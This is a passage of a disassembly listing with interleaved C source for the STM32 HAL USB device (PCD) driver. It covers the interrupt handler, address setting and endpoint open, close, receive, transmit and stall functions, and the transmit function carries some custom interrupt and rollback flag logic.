  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 8001fde:	68fb      	ldr	r3, [r7, #12]
 8001fe0:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8001fe4:	2b00      	cmp	r3, #0
 8001fe6:	d040      	beq.n	800206a <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8001fe8:	687b      	ldr	r3, [r7, #4]
 8001fea:	681b      	ldr	r3, [r3, #0]
 8001fec:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ff0:	b29a      	uxth	r2, r3
 8001ff2:	687b      	ldr	r3, [r7, #4]
 8001ff4:	681b      	ldr	r3, [r3, #0]
 8001ff6:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 8001ffa:	b292      	uxth	r2, r2
 8001ffc:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8002000:	687b      	ldr	r3, [r7, #4]
 8002002:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8002006:	2b00      	cmp	r3, #0
 8002008:	d12b      	bne.n	8002062 <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 800200a:	687b      	ldr	r3, [r7, #4]
 800200c:	681b      	ldr	r3, [r3, #0]
 800200e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8002012:	b29a      	uxth	r2, r3
 8002014:	687b      	ldr	r3, [r7, #4]
 8002016:	681b      	ldr	r3, [r3, #0]
 8002018:	f042 0204 	orr.w	r2, r2, #4
 800201c:	b292      	uxth	r2, r2
 800201e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8002022:	687b      	ldr	r3, [r7, #4]
 8002024:	681b      	ldr	r3, [r3, #0]
 8002026:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 800202a:	b29a      	uxth	r2, r3
 800202c:	687b      	ldr	r3, [r7, #4]
 800202e:	681b      	ldr	r3, [r3, #0]
 8002030:	f042 0208 	orr.w	r2, r2, #8
 8002034:	b292      	uxth	r2, r2
 8002036:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 800203a:	687b      	ldr	r3, [r7, #4]
 800203c:	2201      	movs	r2, #1
 800203e:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 8002042:	687b      	ldr	r3, [r7, #4]
 8002044:	681b      	ldr	r3, [r3, #0]
 8002046:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800204a:	b29b      	uxth	r3, r3
 800204c:	089b      	lsrs	r3, r3, #2
 800204e:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 8002052:	687b      	ldr	r3, [r7, #4]
 8002054:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 8002058:	2101      	movs	r1, #1
 800205a:	6878      	ldr	r0, [r7, #4]
 800205c:	f00a ff58 	bl	800cf10 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 8002060:	e02a      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 8002062:	6878      	ldr	r0, [r7, #4]
 8002064:	f00a fc96 	bl	800c994 <HAL_PCD_SuspendCallback>
    return;
 8002068:	e026      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 800206a:	68fb      	ldr	r3, [r7, #12]
 800206c:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8002070:	2b00      	cmp	r3, #0
 8002072:	d00f      	beq.n	8002094 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 8002074:	687b      	ldr	r3, [r7, #4]
 8002076:	681b      	ldr	r3, [r3, #0]
 8002078:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800207c:	b29a      	uxth	r2, r3
 800207e:	687b      	ldr	r3, [r7, #4]
 8002080:	681b      	ldr	r3, [r3, #0]
 8002082:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 8002086:	b292      	uxth	r2, r2
 8002088:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 800208c:	6878      	ldr	r0, [r7, #4]
 800208e:	f00a fc54 	bl	800c93a <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8002092:	e011      	b.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 8002094:	68fb      	ldr	r3, [r7, #12]
 8002096:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800209a:	2b00      	cmp	r3, #0
 800209c:	d00c      	beq.n	80020b8 <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 800209e:	687b      	ldr	r3, [r7, #4]
 80020a0:	681b      	ldr	r3, [r3, #0]
 80020a2:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80020a6:	b29a      	uxth	r2, r3
 80020a8:	687b      	ldr	r3, [r7, #4]
 80020aa:	681b      	ldr	r3, [r3, #0]
 80020ac:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 80020b0:	b292      	uxth	r2, r2
 80020b2:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 80020b6:	bf00      	nop
  }
}
 80020b8:	3710      	adds	r7, #16
 80020ba:	46bd      	mov	sp, r7
 80020bc:	bd80      	pop	{r7, pc}

080020be <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 80020be:	b580      	push	{r7, lr}
 80020c0:	b082      	sub	sp, #8
 80020c2:	af00      	add	r7, sp, #0
 80020c4:	6078      	str	r0, [r7, #4]
 80020c6:	460b      	mov	r3, r1
 80020c8:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80020ca:	687b      	ldr	r3, [r7, #4]
 80020cc:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80020d0:	2b01      	cmp	r3, #1
 80020d2:	d101      	bne.n	80020d8 <HAL_PCD_SetAddress+0x1a>
 80020d4:	2302      	movs	r3, #2
 80020d6:	e013      	b.n	8002100 <HAL_PCD_SetAddress+0x42>
 80020d8:	687b      	ldr	r3, [r7, #4]
 80020da:	2201      	movs	r2, #1
 80020dc:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 80020e0:	687b      	ldr	r3, [r7, #4]
 80020e2:	78fa      	ldrb	r2, [r7, #3]
 80020e4:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 80020e8:	687b      	ldr	r3, [r7, #4]
 80020ea:	681b      	ldr	r3, [r3, #0]
 80020ec:	78fa      	ldrb	r2, [r7, #3]
 80020ee:	4611      	mov	r1, r2
 80020f0:	4618      	mov	r0, r3
 80020f2:	f006 f94a 	bl	800838a <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 80020f6:	687b      	ldr	r3, [r7, #4]
 80020f8:	2200      	movs	r2, #0
 80020fa:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80020fe:	2300      	movs	r3, #0
}
 8002100:	4618      	mov	r0, r3
 8002102:	3708      	adds	r7, #8
 8002104:	46bd      	mov	sp, r7
 8002106:	bd80      	pop	{r7, pc}

08002108 <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 8002108:	b580      	push	{r7, lr}
 800210a:	b084      	sub	sp, #16
 800210c:	af00      	add	r7, sp, #0
 800210e:	6078      	str	r0, [r7, #4]
 8002110:	4608      	mov	r0, r1
 8002112:	4611      	mov	r1, r2
 8002114:	461a      	mov	r2, r3
 8002116:	4603      	mov	r3, r0
 8002118:	70fb      	strb	r3, [r7, #3]
 800211a:	460b      	mov	r3, r1
 800211c:	803b      	strh	r3, [r7, #0]
 800211e:	4613      	mov	r3, r2
 8002120:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 8002122:	2300      	movs	r3, #0
 8002124:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 8002126:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800212a:	2b00      	cmp	r3, #0
 800212c:	da0e      	bge.n	800214c <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800212e:	78fb      	ldrb	r3, [r7, #3]
 8002130:	f003 0307 	and.w	r3, r3, #7
 8002134:	1c5a      	adds	r2, r3, #1
 8002136:	4613      	mov	r3, r2
 8002138:	009b      	lsls	r3, r3, #2
 800213a:	4413      	add	r3, r2
 800213c:	00db      	lsls	r3, r3, #3
 800213e:	687a      	ldr	r2, [r7, #4]
 8002140:	4413      	add	r3, r2
 8002142:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002144:	68fb      	ldr	r3, [r7, #12]
 8002146:	2201      	movs	r2, #1
 8002148:	705a      	strb	r2, [r3, #1]
 800214a:	e00e      	b.n	800216a <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800214c:	78fb      	ldrb	r3, [r7, #3]
 800214e:	f003 0207 	and.w	r2, r3, #7
 8002152:	4613      	mov	r3, r2
 8002154:	009b      	lsls	r3, r3, #2
 8002156:	4413      	add	r3, r2
 8002158:	00db      	lsls	r3, r3, #3
 800215a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800215e:	687a      	ldr	r2, [r7, #4]
 8002160:	4413      	add	r3, r2
 8002162:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002164:	68fb      	ldr	r3, [r7, #12]
 8002166:	2200      	movs	r2, #0
 8002168:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 800216a:	78fb      	ldrb	r3, [r7, #3]
 800216c:	f003 0307 	and.w	r3, r3, #7
 8002170:	b2da      	uxtb	r2, r3
 8002172:	68fb      	ldr	r3, [r7, #12]
 8002174:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 8002176:	883a      	ldrh	r2, [r7, #0]
 8002178:	68fb      	ldr	r3, [r7, #12]
 800217a:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 800217c:	68fb      	ldr	r3, [r7, #12]
 800217e:	78ba      	ldrb	r2, [r7, #2]
 8002180:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 8002182:	78bb      	ldrb	r3, [r7, #2]
 8002184:	2b02      	cmp	r3, #2
 8002186:	d102      	bne.n	800218e <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 8002188:	68fb      	ldr	r3, [r7, #12]
 800218a:	2200      	movs	r2, #0
 800218c:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 800218e:	687b      	ldr	r3, [r7, #4]
 8002190:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002194:	2b01      	cmp	r3, #1
 8002196:	d101      	bne.n	800219c <HAL_PCD_EP_Open+0x94>
 8002198:	2302      	movs	r3, #2
 800219a:	e00e      	b.n	80021ba <HAL_PCD_EP_Open+0xb2>
 800219c:	687b      	ldr	r3, [r7, #4]
 800219e:	2201      	movs	r2, #1
 80021a0:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 80021a4:	687b      	ldr	r3, [r7, #4]
 80021a6:	681b      	ldr	r3, [r3, #0]
 80021a8:	68f9      	ldr	r1, [r7, #12]
 80021aa:	4618      	mov	r0, r3
 80021ac:	f003 fe8c 	bl	8005ec8 <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 80021b0:	687b      	ldr	r3, [r7, #4]
 80021b2:	2200      	movs	r2, #0
 80021b4:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 80021b8:	7afb      	ldrb	r3, [r7, #11]
}
 80021ba:	4618      	mov	r0, r3
 80021bc:	3710      	adds	r7, #16
 80021be:	46bd      	mov	sp, r7
 80021c0:	bd80      	pop	{r7, pc}

080021c2 <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80021c2:	b580      	push	{r7, lr}
 80021c4:	b084      	sub	sp, #16
 80021c6:	af00      	add	r7, sp, #0
 80021c8:	6078      	str	r0, [r7, #4]
 80021ca:	460b      	mov	r3, r1
 80021cc:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80021ce:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80021d2:	2b00      	cmp	r3, #0
 80021d4:	da0e      	bge.n	80021f4 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80021d6:	78fb      	ldrb	r3, [r7, #3]
 80021d8:	f003 0307 	and.w	r3, r3, #7
 80021dc:	1c5a      	adds	r2, r3, #1
 80021de:	4613      	mov	r3, r2
 80021e0:	009b      	lsls	r3, r3, #2
 80021e2:	4413      	add	r3, r2
 80021e4:	00db      	lsls	r3, r3, #3
 80021e6:	687a      	ldr	r2, [r7, #4]
 80021e8:	4413      	add	r3, r2
 80021ea:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80021ec:	68fb      	ldr	r3, [r7, #12]
 80021ee:	2201      	movs	r2, #1
 80021f0:	705a      	strb	r2, [r3, #1]
 80021f2:	e00e      	b.n	8002212 <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80021f4:	78fb      	ldrb	r3, [r7, #3]
 80021f6:	f003 0207 	and.w	r2, r3, #7
 80021fa:	4613      	mov	r3, r2
 80021fc:	009b      	lsls	r3, r3, #2
 80021fe:	4413      	add	r3, r2
 8002200:	00db      	lsls	r3, r3, #3
 8002202:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002206:	687a      	ldr	r2, [r7, #4]
 8002208:	4413      	add	r3, r2
 800220a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800220c:	68fb      	ldr	r3, [r7, #12]
 800220e:	2200      	movs	r2, #0
 8002210:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 8002212:	78fb      	ldrb	r3, [r7, #3]
 8002214:	f003 0307 	and.w	r3, r3, #7
 8002218:	b2da      	uxtb	r2, r3
 800221a:	68fb      	ldr	r3, [r7, #12]
 800221c:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800221e:	687b      	ldr	r3, [r7, #4]
 8002220:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002224:	2b01      	cmp	r3, #1
 8002226:	d101      	bne.n	800222c <HAL_PCD_EP_Close+0x6a>
 8002228:	2302      	movs	r3, #2
 800222a:	e00e      	b.n	800224a <HAL_PCD_EP_Close+0x88>
 800222c:	687b      	ldr	r3, [r7, #4]
 800222e:	2201      	movs	r2, #1
 8002230:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 8002234:	687b      	ldr	r3, [r7, #4]
 8002236:	681b      	ldr	r3, [r3, #0]
 8002238:	68f9      	ldr	r1, [r7, #12]
 800223a:	4618      	mov	r0, r3
 800223c:	f004 fa08 	bl	8006650 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002240:	687b      	ldr	r3, [r7, #4]
 8002242:	2200      	movs	r2, #0
 8002244:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 8002248:	2300      	movs	r3, #0
}
 800224a:	4618      	mov	r0, r3
 800224c:	3710      	adds	r7, #16
 800224e:	46bd      	mov	sp, r7
 8002250:	bd80      	pop	{r7, pc}

08002252 <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002252:	b580      	push	{r7, lr}
 8002254:	b086      	sub	sp, #24
 8002256:	af00      	add	r7, sp, #0
 8002258:	60f8      	str	r0, [r7, #12]
 800225a:	607a      	str	r2, [r7, #4]
 800225c:	603b      	str	r3, [r7, #0]
 800225e:	460b      	mov	r3, r1
 8002260:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002262:	7afb      	ldrb	r3, [r7, #11]
 8002264:	f003 0207 	and.w	r2, r3, #7
 8002268:	4613      	mov	r3, r2
 800226a:	009b      	lsls	r3, r3, #2
 800226c:	4413      	add	r3, r2
 800226e:	00db      	lsls	r3, r3, #3
 8002270:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002274:	68fa      	ldr	r2, [r7, #12]
 8002276:	4413      	add	r3, r2
 8002278:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800227a:	697b      	ldr	r3, [r7, #20]
 800227c:	687a      	ldr	r2, [r7, #4]
 800227e:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002280:	697b      	ldr	r3, [r7, #20]
 8002282:	683a      	ldr	r2, [r7, #0]
 8002284:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 8002286:	697b      	ldr	r3, [r7, #20]
 8002288:	2200      	movs	r2, #0
 800228a:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 800228c:	697b      	ldr	r3, [r7, #20]
 800228e:	2200      	movs	r2, #0
 8002290:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002292:	7afb      	ldrb	r3, [r7, #11]
 8002294:	f003 0307 	and.w	r3, r3, #7
 8002298:	b2da      	uxtb	r2, r3
 800229a:	697b      	ldr	r3, [r7, #20]
 800229c:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800229e:	68fb      	ldr	r3, [r7, #12]
 80022a0:	681b      	ldr	r3, [r3, #0]
 80022a2:	6979      	ldr	r1, [r7, #20]
 80022a4:	4618      	mov	r0, r3
 80022a6:	f004 fbc0 	bl	8006a2a <USB_EPStartXfer>

  return HAL_OK;
 80022aa:	2300      	movs	r3, #0
}
 80022ac:	4618      	mov	r0, r3
 80022ae:	3718      	adds	r7, #24
 80022b0:	46bd      	mov	sp, r7
 80022b2:	bd80      	pop	{r7, pc}

080022b4 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 80022b4:	b480      	push	{r7}
 80022b6:	b083      	sub	sp, #12
 80022b8:	af00      	add	r7, sp, #0
 80022ba:	6078      	str	r0, [r7, #4]
 80022bc:	460b      	mov	r3, r1
 80022be:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 80022c0:	78fb      	ldrb	r3, [r7, #3]
 80022c2:	f003 0207 	and.w	r2, r3, #7
 80022c6:	6879      	ldr	r1, [r7, #4]
 80022c8:	4613      	mov	r3, r2
 80022ca:	009b      	lsls	r3, r3, #2
 80022cc:	4413      	add	r3, r2
 80022ce:	00db      	lsls	r3, r3, #3
 80022d0:	440b      	add	r3, r1
 80022d2:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 80022d6:	681b      	ldr	r3, [r3, #0]
}
 80022d8:	4618      	mov	r0, r3
 80022da:	370c      	adds	r7, #12
 80022dc:	46bd      	mov	sp, r7
 80022de:	f85d 7b04 	ldr.w	r7, [sp], #4
 80022e2:	4770      	bx	lr

080022e4 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80022e4:	b580      	push	{r7, lr}
 80022e6:	b086      	sub	sp, #24
 80022e8:	af00      	add	r7, sp, #0
 80022ea:	60f8      	str	r0, [r7, #12]
 80022ec:	607a      	str	r2, [r7, #4]
 80022ee:	603b      	str	r3, [r7, #0]
 80022f0:	460b      	mov	r3, r1
 80022f2:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80022f4:	7afb      	ldrb	r3, [r7, #11]
 80022f6:	f003 0307 	and.w	r3, r3, #7
 80022fa:	1c5a      	adds	r2, r3, #1
 80022fc:	4613      	mov	r3, r2
 80022fe:	009b      	lsls	r3, r3, #2
 8002300:	4413      	add	r3, r2
 8002302:	00db      	lsls	r3, r3, #3
 8002304:	68fa      	ldr	r2, [r7, #12]
 8002306:	4413      	add	r3, r2
 8002308:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800230a:	697b      	ldr	r3, [r7, #20]
 800230c:	687a      	ldr	r2, [r7, #4]
 800230e:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002310:	697b      	ldr	r3, [r7, #20]
 8002312:	683a      	ldr	r2, [r7, #0]
 8002314:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 8002316:	697b      	ldr	r3, [r7, #20]
 8002318:	2201      	movs	r2, #1
 800231a:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 800231e:	697b      	ldr	r3, [r7, #20]
 8002320:	683a      	ldr	r2, [r7, #0]
 8002322:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 8002324:	697b      	ldr	r3, [r7, #20]
 8002326:	2200      	movs	r2, #0
 8002328:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 800232a:	697b      	ldr	r3, [r7, #20]
 800232c:	2201      	movs	r2, #1
 800232e:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002330:	7afb      	ldrb	r3, [r7, #11]
 8002332:	f003 0307 	and.w	r3, r3, #7
 8002336:	b2da      	uxtb	r2, r3
 8002338:	697b      	ldr	r3, [r7, #20]
 800233a:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 800233c:	4b0e      	ldr	r3, [pc, #56]	; (8002378 <HAL_PCD_EP_Transmit+0x94>)
 800233e:	781b      	ldrb	r3, [r3, #0]
 8002340:	f003 0302 	and.w	r3, r3, #2
 8002344:	2b00      	cmp	r3, #0
 8002346:	d102      	bne.n	800234e <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 8002348:	4b0c      	ldr	r3, [pc, #48]	; (800237c <HAL_PCD_EP_Transmit+0x98>)
 800234a:	2201      	movs	r2, #1
 800234c:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 800234e:	68fb      	ldr	r3, [r7, #12]
 8002350:	681b      	ldr	r3, [r3, #0]
 8002352:	6979      	ldr	r1, [r7, #20]
 8002354:	4618      	mov	r0, r3
 8002356:	f004 fb68 	bl	8006a2a <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 800235a:	4b07      	ldr	r3, [pc, #28]	; (8002378 <HAL_PCD_EP_Transmit+0x94>)
 800235c:	781b      	ldrb	r3, [r3, #0]
 800235e:	f003 0302 	and.w	r3, r3, #2
 8002362:	2b00      	cmp	r3, #0
 8002364:	d102      	bne.n	800236c <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 8002366:	4b06      	ldr	r3, [pc, #24]	; (8002380 <HAL_PCD_EP_Transmit+0x9c>)
 8002368:	2201      	movs	r2, #1
 800236a:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 800236c:	2300      	movs	r3, #0
}
 800236e:	4618      	mov	r0, r3
 8002370:	3718      	adds	r7, #24
 8002372:	46bd      	mov	sp, r7
 8002374:	bd80      	pop	{r7, pc}
 8002376:	bf00      	nop
 8002378:	2000026c 	.word	0x2000026c
 800237c:	20000270 	.word	0x20000270
 8002380:	2000027c 	.word	0x2000027c

08002384 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002384:	b580      	push	{r7, lr}
 8002386:	b084      	sub	sp, #16
 8002388:	af00      	add	r7, sp, #0
 800238a:	6078      	str	r0, [r7, #4]
 800238c:	460b      	mov	r3, r1
 800238e:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 8002390:	78fb      	ldrb	r3, [r7, #3]
 8002392:	f003 0207 	and.w	r2, r3, #7
 8002396:	687b      	ldr	r3, [r7, #4]
 8002398:	685b      	ldr	r3, [r3, #4]
 800239a:	429a      	cmp	r2, r3
 800239c:	d901      	bls.n	80023a2 <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 800239e:	2301      	movs	r3, #1
 80023a0:	e04c      	b.n	800243c <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80023a2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80023a6:	2b00      	cmp	r3, #0
 80023a8:	da0e      	bge.n	80023c8 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80023aa:	78fb      	ldrb	r3, [r7, #3]
 80023ac:	f003 0307 	and.w	r3, r3, #7
 80023b0:	1c5a      	adds	r2, r3, #1
 80023b2:	4613      	mov	r3, r2
 80023b4:	009b      	lsls	r3, r3, #2
 80023b6:	4413      	add	r3, r2
 80023b8:	00db      	lsls	r3, r3, #3
 80023ba:	687a      	ldr	r2, [r7, #4]
 80023bc:	4413      	add	r3, r2
 80023be:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80023c0:	68fb      	ldr	r3, [r7, #12]
 80023c2:	2201      	movs	r2, #1
 80023c4:	705a      	strb	r2, [r3, #1]
 80023c6:	e00c      	b.n	80023e2 <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80023c8:	78fa      	ldrb	r2, [r7, #3]
 80023ca:	4613      	mov	r3, r2
 80023cc:	009b      	lsls	r3, r3, #2
 80023ce:	4413      	add	r3, r2
 80023d0:	00db      	lsls	r3, r3, #3
 80023d2:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023d6:	687a      	ldr	r2, [r7, #4]
 80023d8:	4413      	add	r3, r2
 80023da:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023dc:	68fb      	ldr	r3, [r7, #12]
 80023de:	2200      	movs	r2, #0
 80023e0:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 80023e2:	68fb      	ldr	r3, [r7, #12]
 80023e4:	2201      	movs	r2, #1
 80023e6:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80023e8:	78fb      	ldrb	r3, [r7, #3]
 80023ea:	f003 0307 	and.w	r3, r3, #7
 80023ee:	b2da      	uxtb	r2, r3
 80023f0:	68fb      	ldr	r3, [r7, #12]
 80023f2:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80023f4:	687b      	ldr	r3, [r7, #4]
